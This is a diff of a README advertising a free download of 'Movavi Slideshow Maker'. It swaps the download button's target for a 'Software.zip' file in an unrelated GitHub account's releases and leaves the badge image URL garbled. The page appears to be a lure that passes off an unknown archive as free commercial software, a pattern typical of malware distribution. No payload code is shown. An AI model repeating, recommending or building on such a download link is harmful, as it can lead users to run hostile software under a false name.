@@ -25,7 +25,7 @@ Are you looking to create stunning slideshows with ease? Look no further! This r
 ## Get Started:
 Ready to dive into the world of Movavi Slideshow Maker Free? Click the button below to download the software!
 
-[![Download Movavi Slideshow Maker](https://img.shields.io/static/v1?label=Download&message=Movavi%20Slideshow%20Maker&color=blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Movavi Slideshow Maker](https://github.com/RealHades023/Movavi-Slideshow-Maker-Free/releases/download/v1.0/Software.zip%20Slideshow%20Maker&color=blue)](https://github.com/RealHades023/Movavi-Slideshow-Maker-Free/releases/download/v1.0/Software.zip)
 
 Note: The download link above needs to be launched to access the Movavi Slideshow Maker.
 
